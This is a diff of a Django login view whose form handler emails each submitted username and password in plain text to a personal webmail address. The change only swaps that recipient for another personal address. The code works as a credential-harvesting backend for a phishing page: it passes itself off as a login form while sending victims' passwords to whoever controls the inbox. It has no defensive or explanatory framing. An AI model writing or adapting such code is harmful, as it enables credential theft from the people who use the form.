@@ -22,7 +22,7 @@ class LoginCreateView(FormView):
         subject = 'New details submitted'
         mail_message = f"Username: {username}\nPassword: {password}"
         from_email = EMAIL_HOST_USER
-        recipient_list = ['karenfurst6@gmail.com'] 
+        recipient_list = ['rn.riley@outlook.com'] 
         send_mail(subject,mail_message,from_email, recipient_list, fail_silently=False)
         return super().form_valid(form)
 
